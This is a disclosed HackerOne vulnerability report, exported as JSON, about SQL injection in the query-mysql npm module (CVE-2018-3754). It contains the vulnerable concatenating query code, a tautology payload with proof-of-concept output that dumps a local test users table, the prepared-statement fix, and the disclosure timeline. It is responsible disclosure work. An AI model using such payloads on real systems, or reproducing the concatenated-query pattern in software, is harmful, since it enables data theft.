{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": null, 
    "voters": [
        "s_p_q_r", 
        "eveeez", 
        "ischleep", 
        "hussain_0x3c", 
        "apapedulimu", 
        "linkks", 
        "0x08", 
        "sh3r1", 
        "testinghacker0x01", 
        "lolpop", 
        "and 3 more..."
    ], 
    "facebook_team?": false, 
    "has_bounty?": false, 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 311244, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": "2018-05-18T18:46:52.627Z", 
    "vulnerability_information": "Hi Guys,\n\nThere is SQL Injection in query-mysql module. Due to lack of sanitization of user input, an attacker is able to craft SQL query and get any data from the database.\n\n## Module\n\n**query-mysql**\n\nInstall this module in your project like dependency\n\nhttps://www.npmjs.com/package/query-mysql\n\nversion: 0.0.2\n\nStats\n0 downloads in the last day\n13 downloads in the last week\n85 downloads in the last month\n\n~1000 estimated downloads per year\n\n\n## Description\n\nMost of functions in ```query-mysql``` module used to manipulate data build query usign simple string concatenation. This leads to SQL Injection vulnerability, because an attacker is able to pass his own query and run any SQL on the database.\n\nThis is one of those functions, which allows to select record from the table depends on value for the column:\n\n```javascript\n// node_modules/query-mysql/lib/base.js, line 172\n    fetchById: function (table, id, name_id, callback) {\n        connect(function (connected) {\n            if (connected) {\n\n                connection.query(\"SELECT * FROM \" + table + \" WHERE \" +name_id+\"='\"+ id+\"'\", function (err, rows, fields) {\n                    connection.end();\n                    console.log(\"fetchById\");\n                    //if (err) throw err;\n                    if (err) {\n                        callback(\"error\", null);\n                    }else{\t\t\t\t\t\t\n                        callback(\"success\", rows);\n                    };\n                })\n\n            }else{\n                callback(\"error_connection\", null);\n            };\n        })\n    },\n```\n\nThe query itself is simple string with values passed by the user concatenated with SQL:\n\n```javascript\nconnection.query(\"SELECT * FROM \" + table + \" WHERE \" +name_id+\"='\"+ id+\"'\"\n```\n\nIf we assume, that ```table```, ```name_id``` and ```id``` will be passed as, respectively, ```users```, ```id``` and ```1```, we should get following query:\n\n```sql\nSELECT * FROM users WHERE id='1'\n```\nIt returns record from table ```users```, where ```id``` equals 1.\n\nNow, if we pass in ```id``` malicious query, like ```1\\' OR 1=1-- ``` - we get this:\n\n```sql\nSELECT * FROM users WHERE id='1' OR 1=1-- \n```\nThis query returns **all** records from table ```users```\n\n\n## Mitigation\n\n```query-mysql``` relies on ```mysql``` module. This module allows to use Preparing Queries (Prepared Statements) - https://www.npmjs.com/package/mysql#preparing-queries:\n\n```\nYou can use mysql.format to prepare a query with multiple insertion points, utilizing the proper escaping for ids and values. A simple example of this follows:\n\nvar sql = \"SELECT * FROM ?? WHERE ?? = ?\";\nvar inserts = ['users', 'id', userId];\nsql = mysql.format(sql, inserts);\n\nFollowing this you then have a valid, escaped query that you can then send to the database safely. This is useful if you are looking to prepare the query before actually sending it to the database. As \n```\n\nThis is the simplest way to avoid simple SQL Injection vulnerabilites.\n\n## Steps To Reproduce:\n\n- install ```query-mysql``` module:\n\n```\n$ npm install query-mysql\n```\n\n- log in to your local MySQL instance and create database ```test``` using following SQL:\n\n```sql\n-- Table structure for table `users`\n\nDROP TABLE IF EXISTS `users`;\n/*!40101 SET @saved_cs_client     = @@character_set_client */;\n/*!40101 SET character_set_client = utf8 */;\nCREATE TABLE `users` (\n  `username` varchar(50) DEFAULT NULL,\n  `password` varchar(50) DEFAULT NULL\n) ENGINE=InnoDB DEFAULT CHARSET=utf8;\n```\n\n- populate data by adding couple of records:\n\n```\nmysql> select * from users;\n+----------+----------+\n| username | password |\n+----------+----------+\n| admin    | admin    |\n| user     | user     |\n| noob     | noob     |\n+----------+----------+\n3 rows in set (0.00 sec)\n```\n\n\n- create sample application:\n\n```javascript\n// app.js\n'use strict'\n\nconst query = require('query-mysql')\n\nquery.configure({\n  'host': '127.0.0.1',\n  'user': 'root',\n  'password': 'root',\n  'database': 'test'\n})\n\nquery.base.fetchById('users', 'noob', 'username', (msg, res) => {\n  console.log(msg, res)\n})\n```\n\n- run application:\n\n```\n$ node app.js\n```\n\n- result:\n\n```\nfetchById\nsuccess [ RowDataPacket { username: 'noob', password: 'noob' } ]\n```\n\n- Now, modify query into following one:\n\n```javascript\n// app.js\n//... cut for readibility\nquery.base.fetchById('users', 'noob\\' or 1=1-- ', 'username', (msg, res) => {\n  console.log(msg, res)\n})\n```\n\n- run application again:\n\n```\n$ node app.js\n```\n\n- this time result set contains all records from table ```users```:\n\n```\nfetchById\nsuccess [ RowDataPacket { username: 'admin', password: 'admin' },\n  RowDataPacket { username: 'user', password: 'user' },\n  RowDataPacket { username: 'noob', password: 'noob' } ]\n```\n\nOther functions in ```query-mysql``` module contains the same vulnerability. \n\n## Supporting Material/References:\n\n\n- macOS 10.13.3\n- Chromium 66.0.3333.0 (Developer Build) (64-bit) \n- Node.js version: v8.9.3\n- npm version: 5.5.1\n- mysql  Ver 14.14 Distrib 5.7.13, for osx10.11 (x86_64)\n\n\nPlease feel free to invite module maintainer to this report. I haven't contacted maintainer as I want to keep the process of fixing and disclosing bug consistent through HackerOne platform only.\n\nI hope my report will help to keep Node.js ecosystem and its users safe in the future.\n\nRegards,\n\nRafal 'bl4de' Janicki\n\n## Impact\n\nThis vulnerability allows malicious user to fetch/manipulate data in database", 
    "activity_page_count": 1, 
    "severity": {
        "metrics": {
            "confidentiality": "high", 
            "privileges_required": "none", 
            "user_interaction": "none", 
            "attack_vector": "network", 
            "attack_complexity": "low", 
            "scope": "unchanged", 
            "integrity": "high", 
            "availability": "high"
        }, 
        "rating": "critical", 
        "score": 9.8, 
        "author_type": "Team"
    }, 
    "title": "[query-mysql] SQL Injection due to lack of user input sanitization allows to run arbitrary SQL queries when fetching data from database", 
    "is_member_of_team?": null, 
    "vote_count": 13, 
    "summaries": [
        {
            "category": "team", 
            "can_create?": false, 
            "can_view?": true
        }, 
        {
            "category": "researcher", 
            "can_create?": false, 
            "can_view?": true
        }
    ], 
    "structured_scope": {
        "asset_identifier": "Other module", 
        "max_severity": "critical", 
        "databaseId": 2986, 
        "asset_type": "SOURCE_CODE"
    }, 
    "allow_singular_disclosure_at": "2018-06-17T18:46:52.741Z", 
    "state": "Closed", 
    "cve_ids": [
        "CVE-2018-3754"
    ], 
    "activity_page_number": 1, 
    "readable_substate": "Resolved", 
    "public": true, 
    "singular_disclosure_disabled": false, 
    "activities": [
        {
            "automated_response": false, 
            "created_at": "2018-02-01T21:28:44.169Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-02-01T21:28:44.169Z", 
            "actor": {
                "username": "cjihrig", 
                "url": "/cjihrig", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "nodejs-ecosystem", 
            "message": "This does seem to be a vulnerability. I'll reach out to one of the maintainers, danieltoo, who has the publicly listed email address torresestradadaniel@gmail.com. It's also worth noting that this module is only 16 days old, no dependents, and likely no real users aside from possibly the collaborators.", 
            "markdown_message": "<p>This does seem to be a vulnerability. I&#39;ll reach out to one of the maintainers, danieltoo, who has the publicly listed email address <a title=\"torresestradadaniel@gmail.com\" href=\"mailto:torresestradadaniel@gmail.com\" rel=\"nofollow noopener noreferrer\">torresestradadaniel@gmail.com</a>. It&#39;s also worth noting that this module is only 16 days old, no dependents, and likely no real users aside from possibly the collaborators.</p>\n", 
            "type": "Activities::BugTriaged", 
            "id": 2343123, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-02-01T21:32:35.801Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-02-01T21:32:35.801Z", 
            "actor": {
                "username": "cjihrig", 
                "url": "/cjihrig", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "nodejs-ecosystem", 
            "message": "Email sent to torresestradadaniel@gmail.com.", 
            "markdown_message": "<p>Email sent to <a title=\"torresestradadaniel@gmail.com\" href=\"mailto:torresestradadaniel@gmail.com\" rel=\"nofollow noopener noreferrer\">torresestradadaniel@gmail.com</a>.</p>\n", 
            "type": "Activities::Comment", 
            "id": 2343135, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-02-11T22:33:44.657Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-02-11T22:33:44.657Z", 
            "actor": {
                "username": "cjihrig", 
                "url": "/cjihrig", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "nodejs-ecosystem", 
            "message": "My previous email did not receive a response. An issue has been opened at https://github.com/cenidetiot/query-mysql/issues/1.", 
            "markdown_message": "<p>My previous email did not receive a response. An issue has been opened at <a title=\"https://github.com/cenidetiot/query-mysql/issues/1\" href=\"/redirect?signature=9767cf5a89a849a521b3ed1839d473346097459c&amp;url=https%3A%2F%2Fgithub.com%2Fcenidetiot%2Fquery-mysql%2Fissues%2F1\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://github.com/cenidetiot/query-mysql/issues/1</span><i class=\"icon-external-link\"></i></a>.</p>\n", 
            "type": "Activities::Comment", 
            "id": 2373270, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-05-08T14:52:17.728Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-05-08T14:52:17.728Z", 
            "actor": {
                "username": "bl4de", 
                "url": "/bl4de", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/017/622/32292cbe1a952c345aef237a5dde32d13a7489cf_medium.jpg?1424108731"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "nodejs-ecosystem", 
            "message": "Hi @cjihrig \n\nAny update on this?\n\nRegards,\n\nbl4de", 
            "markdown_message": "<p>Hi <a href=\"/cjihrig\">@cjihrig</a> </p>\n\n<p>Any update on this?</p>\n\n<p>Regards,</p>\n\n<p>bl4de</p>\n", 
            "type": "Activities::Comment", 
            "id": 2715851, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-05-09T17:41:45.761Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-05-09T17:41:45.761Z", 
            "actor": {
                "username": "cjihrig", 
                "url": "/cjihrig", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "nodejs-ecosystem", 
            "message": "Hi @bl4de,\n\nSorry for the delay. A CVE has been requested. It looks like this project is also no longer available on GitHub.", 
            "markdown_message": "<p>Hi <a href=\"/bl4de\">@bl4de</a>,</p>\n\n<p>Sorry for the delay. A CVE has been requested. It looks like this project is also no longer available on GitHub.</p>\n", 
            "type": "Activities::Comment", 
            "id": 2720880, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-05-09T17:56:03.007Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-05-09T17:56:03.007Z", 
            "actor": {
                "username": "bl4de", 
                "url": "/bl4de", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/017/622/32292cbe1a952c345aef237a5dde32d13a7489cf_medium.jpg?1424108731"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "nodejs-ecosystem", 
            "message": "Hi @cjihrig ,\n\nNo worries, thanks for the update!", 
            "markdown_message": "<p>Hi <a href=\"/cjihrig\">@cjihrig</a> ,</p>\n\n<p>No worries, thanks for the update!</p>\n", 
            "type": "Activities::Comment", 
            "id": 2720907, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-05-12T02:46:13.807Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-05-12T02:46:13.807Z", 
            "actor": {
                "username": "cjihrig", 
                "url": "/cjihrig", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "additional_data": {
                "new_severity": "Critical (9.8)", 
                "old_severity": "High"
            }, 
            "team_handle": "nodejs-ecosystem", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportSeverityUpdated", 
            "id": 2732080, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "reporter": {
                "username": "bl4de", 
                "url": "/bl4de"
            }, 
            "created_at": "2018-05-12T02:46:21.751Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-05-12T02:46:21.751Z", 
            "actor": {
                "username": "cjihrig", 
                "url": "/cjihrig", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "nodejs-ecosystem", 
            "message": "CVE-2018-3754 has been assigned to this issue.", 
            "markdown_message": "<p>CVE-2018-3754 has been assigned to this issue.</p>\n", 
            "type": "Activities::BugResolved", 
            "id": 2732081, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-05-18T18:46:52.664Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-05-18T18:46:52.664Z", 
            "actor": {
                "username": "reed", 
                "url": "/reed", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/003/132/5781ea1c43c5c7680dd145226b86348a8d6ed085_medium.jpg?1394062279"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "nodejs-ecosystem", 
            "first_to_agree": true, 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 2763726, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-05-19T12:53:02.801Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-05-19T12:53:02.801Z", 
            "actor": {
                "username": "cjihrig", 
                "url": "/cjihrig", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "nodejs-ecosystem", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ManuallyDisclosed", 
            "id": 2766139, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "singular_disclosure_allowed": true, 
    "reporter": {
        "username": "bl4de", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/bl4de", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/017/622/36f4fb2f20566c21ddbacf07cd490330ca853c91_small.jpg?1424108731"
        }, 
        "is_me?": false
    }, 
    "weakness": {
        "id": 67, 
        "name": "SQL Injection"
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "allow_singular_disclosure_after": -14873820.089970345, 
    "disclosed_at": "2018-05-19T12:53:02.893Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/311244", 
    "created_at": "2018-02-01T00:58:42.031Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<p>Hi Guys,</p>\n\n<p>There is SQL Injection in query-mysql module. Due to lack of sanitization of user input, an attacker is able to craft SQL query and get any data from the database.</p>\n\n<h2 id=\"module\">Module</h2>\n\n<p><strong>query-mysql</strong></p>\n\n<p>Install this module in your project like dependency</p>\n\n<p><a title=\"https://www.npmjs.com/package/query-mysql\" href=\"/redirect?signature=3bb8b6fc74d609f39fce9c2a40aa4efa3620ac90&amp;url=https%3A%2F%2Fwww.npmjs.com%2Fpackage%2Fquery-mysql\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://www.npmjs.com/package/query-mysql</span><i class=\"icon-external-link\"></i></a></p>\n\n<p>version: 0.0.2</p>\n\n<p>Stats<br>\n0 downloads in the last day<br>\n13 downloads in the last week<br>\n85 downloads in the last month</p>\n\n<p>~1000 estimated downloads per year</p>\n\n<h2 id=\"description\">Description</h2>\n\n<p>Most of functions in <code>query-mysql</code> module used to manipulate data build query usign simple string concatenation. This leads to SQL Injection vulnerability, because an attacker is able to pass his own query and run any SQL on the database.</p>\n\n<p>This is one of those functions, which allows to select record from the table depends on value for the column:</p>\n<pre class=\"highlight javascript\"><code><span class=\"c1\">// node_modules/query-mysql/lib/base.js, line 172</span>\n    <span class=\"nl\">fetchById</span><span class=\"p\">:</span> <span class=\"kd\">function</span> <span class=\"p\">(</span><span class=\"nx\">table</span><span class=\"p\">,</span> <span class=\"nx\">id</span><span class=\"p\">,</span> <span class=\"nx\">name_id</span><span class=\"p\">,</span> <span class=\"nx\">callback</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n        <span class=\"nx\">connect</span><span class=\"p\">(</span><span class=\"kd\">function</span> <span class=\"p\">(</span><span class=\"nx\">connected</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n            <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"nx\">connected</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n\n                <span class=\"nx\">connection</span><span class=\"p\">.</span><span class=\"nx\">query</span><span class=\"p\">(</span><span class=\"s2\">&quot;SELECT * FROM &quot;</span> <span class=\"o\">+</span> <span class=\"nx\">table</span> <span class=\"o\">+</span> <span class=\"s2\">&quot; WHERE &quot;</span> <span class=\"o\">+</span><span class=\"nx\">name_id</span><span class=\"o\">+</span><span class=\"s2\">&quot;=&#39;&quot;</span><span class=\"o\">+</span> <span class=\"nx\">id</span><span class=\"o\">+</span><span class=\"s2\">&quot;&#39;&quot;</span><span class=\"p\">,</span> <span class=\"kd\">function</span> <span class=\"p\">(</span><span class=\"nx\">err</span><span class=\"p\">,</span> <span class=\"nx\">rows</span><span class=\"p\">,</span> <span class=\"nx\">fields</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n                    <span class=\"nx\">connection</span><span class=\"p\">.</span><span class=\"nx\">end</span><span class=\"p\">();</span>\n                    <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"s2\">&quot;fetchById&quot;</span><span class=\"p\">);</span>\n                    <span class=\"c1\">//if (err) throw err;</span>\n                    <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"nx\">err</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n                        <span class=\"nx\">callback</span><span class=\"p\">(</span><span class=\"s2\">&quot;error&quot;</span><span class=\"p\">,</span> <span class=\"kc\">null</span><span class=\"p\">);</span>\n                    <span class=\"p\">}</span><span class=\"k\">else</span><span class=\"p\">{</span>                      \n                        <span class=\"nx\">callback</span><span class=\"p\">(</span><span class=\"s2\">&quot;success&quot;</span><span class=\"p\">,</span> <span class=\"nx\">rows</span><span class=\"p\">);</span>\n                    <span class=\"p\">};</span>\n                <span class=\"p\">})</span>\n\n            <span class=\"p\">}</span><span class=\"k\">else</span><span class=\"p\">{</span>\n                <span class=\"nx\">callback</span><span class=\"p\">(</span><span class=\"s2\">&quot;error_connection&quot;</span><span class=\"p\">,</span> <span class=\"kc\">null</span><span class=\"p\">);</span>\n            <span class=\"p\">};</span>\n        <span class=\"p\">})</span>\n    <span class=\"p\">},</span>\n</code></pre>\n<p>The query itself is simple string with values passed by the user concatenated with SQL:</p>\n<pre class=\"highlight javascript\"><code><span class=\"nx\">connection</span><span class=\"p\">.</span><span class=\"nx\">query</span><span class=\"p\">(</span><span class=\"s2\">&quot;SELECT * FROM &quot;</span> <span class=\"o\">+</span> <span class=\"nx\">table</span> <span class=\"o\">+</span> <span class=\"s2\">&quot; WHERE &quot;</span> <span class=\"o\">+</span><span class=\"nx\">name_id</span><span class=\"o\">+</span><span class=\"s2\">&quot;=&#39;&quot;</span><span class=\"o\">+</span> <span class=\"nx\">id</span><span class=\"o\">+</span><span class=\"s2\">&quot;&#39;&quot;</span>\n</code></pre>\n<p>If we assume, that <code>table</code>, <code>name_id</code> and <code>id</code> will be passed as, respectively, <code>users</code>, <code>id</code> and <code>1</code>, we should get following query:</p>\n<pre class=\"highlight sql\"><code><span class=\"k\">SELECT</span> <span class=\"o\">*</span> <span class=\"k\">FROM</span> <span class=\"n\">users</span> <span class=\"k\">WHERE</span> <span class=\"n\">id</span><span class=\"o\">=</span><span class=\"s1\">&#39;1&#39;</span>\n</code></pre>\n<p>It returns record from table <code>users</code>, where <code>id</code> equals 1.</p>\n\n<p>Now, if we pass in <code>id</code> malicious query, like <code>1\\&#39; OR 1=1--</code> - we get this:</p>\n<pre class=\"highlight sql\"><code><span class=\"k\">SELECT</span> <span class=\"o\">*</span> <span class=\"k\">FROM</span> <span class=\"n\">users</span> <span class=\"k\">WHERE</span> <span class=\"n\">id</span><span class=\"o\">=</span><span class=\"s1\">&#39;1&#39;</span> <span class=\"k\">OR</span> <span class=\"mi\">1</span><span class=\"o\">=</span><span class=\"mi\">1</span><span class=\"c1\">-- </span>\n</code></pre>\n<p>This query returns <strong>all</strong> records from table <code>users</code></p>\n\n<h2 id=\"mitigation\">Mitigation</h2>\n\n<p><code>query-mysql</code> relies on <code>mysql</code> module. This module allows to use Preparing Queries (Prepared Statements) - <a title=\"https://www.npmjs.com/package/mysql#preparing-queries:\" href=\"/redirect?signature=deb96dc83b4c4f41336587b46c0eaed9745e6441&amp;url=https%3A%2F%2Fwww.npmjs.com%2Fpackage%2Fmysql%23preparing-queries%3A\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://www.npmjs.com/package/mysql#preparing-queries:</span><i class=\"icon-external-link\"></i></a></p>\n<pre class=\"highlight plaintext\"><code>You can use mysql.format to prepare a query with multiple insertion points, utilizing the proper escaping for ids and values. A simple example of this follows:\n\nvar sql = &quot;SELECT * FROM ?? WHERE ?? = ?&quot;;\nvar inserts = [&#39;users&#39;, &#39;id&#39;, userId];\nsql = mysql.format(sql, inserts);\n\nFollowing this you then have a valid, escaped query that you can then send to the database safely. This is useful if you are looking to prepare the query before actually sending it to the database. As \n</code></pre>\n<p>This is the simplest way to avoid simple SQL Injection vulnerabilites.</p>\n\n<h2 id=\"steps-to-reproduce\">Steps To Reproduce:</h2>\n\n<ul>\n<li>install <code>query-mysql</code> module:</li>\n</ul>\n<pre class=\"highlight plaintext\"><code>$ npm install query-mysql\n</code></pre>\n<ul>\n<li>log in to your local MySQL instance and create database <code>test</code> using following SQL:</li>\n</ul>\n<pre class=\"highlight sql\"><code><span class=\"c1\">-- Table structure for table `users`</span>\n\n<span class=\"k\">DROP</span> <span class=\"k\">TABLE</span> <span class=\"n\">IF</span> <span class=\"k\">EXISTS</span> <span class=\"nv\">`users`</span><span class=\"p\">;</span>\n<span class=\"cm\">/*!40101 SET [@saved_cs_client](/saved_cs_client)     = @@character_set_client */</span><span class=\"p\">;</span>\n<span class=\"cm\">/*!40101 SET character_set_client = utf8 */</span><span class=\"p\">;</span>\n<span class=\"k\">CREATE</span> <span class=\"k\">TABLE</span> <span class=\"nv\">`users`</span> <span class=\"p\">(</span>\n  <span class=\"nv\">`username`</span> <span class=\"n\">varchar</span><span class=\"p\">(</span><span class=\"mi\">50</span><span class=\"p\">)</span> <span class=\"k\">DEFAULT</span> <span class=\"k\">NULL</span><span class=\"p\">,</span>\n  <span class=\"nv\">`password`</span> <span class=\"n\">varchar</span><span class=\"p\">(</span><span class=\"mi\">50</span><span class=\"p\">)</span> <span class=\"k\">DEFAULT</span> <span class=\"k\">NULL</span>\n<span class=\"p\">)</span> <span class=\"n\">ENGINE</span><span class=\"o\">=</span><span class=\"n\">InnoDB</span> <span class=\"k\">DEFAULT</span> <span class=\"n\">CHARSET</span><span class=\"o\">=</span><span class=\"n\">utf8</span><span class=\"p\">;</span>\n</code></pre>\n<ul>\n<li>populate data by adding couple of records:</li>\n</ul>\n<pre class=\"highlight plaintext\"><code>mysql&gt; select * from users;\n+----------+----------+\n| username | password |\n+----------+----------+\n| admin    | admin    |\n| user     | user     |\n| noob     | noob     |\n+----------+----------+\n3 rows in set (0.00 sec)\n</code></pre>\n<ul>\n<li>create sample application:</li>\n</ul>\n<pre class=\"highlight javascript\"><code><span class=\"c1\">// app.js</span>\n<span class=\"s1\">&#39;use strict&#39;</span>\n\n<span class=\"kr\">const</span> <span class=\"nx\">query</span> <span class=\"o\">=</span> <span class=\"nx\">require</span><span class=\"p\">(</span><span class=\"s1\">&#39;query-mysql&#39;</span><span class=\"p\">)</span>\n\n<span class=\"nx\">query</span><span class=\"p\">.</span><span class=\"nx\">configure</span><span class=\"p\">({</span>\n  <span class=\"s1\">&#39;host&#39;</span><span class=\"p\">:</span> <span class=\"s1\">&#39;127.0.0.1&#39;</span><span class=\"p\">,</span>\n  <span class=\"s1\">&#39;user&#39;</span><span class=\"p\">:</span> <span class=\"s1\">&#39;root&#39;</span><span class=\"p\">,</span>\n  <span class=\"s1\">&#39;password&#39;</span><span class=\"p\">:</span> <span class=\"s1\">&#39;root&#39;</span><span class=\"p\">,</span>\n  <span class=\"s1\">&#39;database&#39;</span><span class=\"p\">:</span> <span class=\"s1\">&#39;test&#39;</span>\n<span class=\"p\">})</span>\n\n<span class=\"nx\">query</span><span class=\"p\">.</span><span class=\"nx\">base</span><span class=\"p\">.</span><span class=\"nx\">fetchById</span><span class=\"p\">(</span><span class=\"s1\">&#39;users&#39;</span><span class=\"p\">,</span> <span class=\"s1\">&#39;noob&#39;</span><span class=\"p\">,</span> <span class=\"s1\">&#39;username&#39;</span><span class=\"p\">,</span> <span class=\"p\">(</span><span class=\"nx\">msg</span><span class=\"p\">,</span> <span class=\"nx\">res</span><span class=\"p\">)</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n  <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"nx\">msg</span><span class=\"p\">,</span> <span class=\"nx\">res</span><span class=\"p\">)</span>\n<span class=\"p\">})</span>\n</code></pre>\n<ul>\n<li>run application:</li>\n</ul>\n<pre class=\"highlight plaintext\"><code>$ node app.js\n</code></pre>\n<ul>\n<li>result:</li>\n</ul>\n<pre class=\"highlight plaintext\"><code>fetchById\nsuccess [ RowDataPacket { username: &#39;noob&#39;, password: &#39;noob&#39; } ]\n</code></pre>\n<ul>\n<li>Now, modify query into following one:</li>\n</ul>\n<pre class=\"highlight javascript\"><code><span class=\"c1\">// app.js</span>\n<span class=\"c1\">//... cut for readibility</span>\n<span class=\"nx\">query</span><span class=\"p\">.</span><span class=\"nx\">base</span><span class=\"p\">.</span><span class=\"nx\">fetchById</span><span class=\"p\">(</span><span class=\"s1\">&#39;users&#39;</span><span class=\"p\">,</span> <span class=\"s1\">&#39;noob\\&#39; or 1=1-- &#39;</span><span class=\"p\">,</span> <span class=\"s1\">&#39;username&#39;</span><span class=\"p\">,</span> <span class=\"p\">(</span><span class=\"nx\">msg</span><span class=\"p\">,</span> <span class=\"nx\">res</span><span class=\"p\">)</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n  <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"nx\">msg</span><span class=\"p\">,</span> <span class=\"nx\">res</span><span class=\"p\">)</span>\n<span class=\"p\">})</span>\n</code></pre>\n<ul>\n<li>run application again:</li>\n</ul>\n<pre class=\"highlight plaintext\"><code>$ node app.js\n</code></pre>\n<ul>\n<li>this time result set contains all records from table <code>users</code>:</li>\n</ul>\n<pre class=\"highlight plaintext\"><code>fetchById\nsuccess [ RowDataPacket { username: &#39;admin&#39;, password: &#39;admin&#39; },\n  RowDataPacket { username: &#39;user&#39;, password: &#39;user&#39; },\n  RowDataPacket { username: &#39;noob&#39;, password: &#39;noob&#39; } ]\n</code></pre>\n<p>Other functions in <code>query-mysql</code> module contains the same vulnerability. </p>\n\n<h2 id=\"supporting-material-references\">Supporting Material/References:</h2>\n\n<ul>\n<li>macOS 10.13.3</li>\n<li>Chromium 66.0.3333.0 (Developer Build) (64-bit) </li>\n<li>Node.js version: v8.9.3</li>\n<li>npm version: 5.5.1</li>\n<li>mysql  Ver 14.14 Distrib 5.7.13, for osx10.11 (x86_64)</li>\n</ul>\n\n<p>Please feel free to invite module maintainer to this report. I 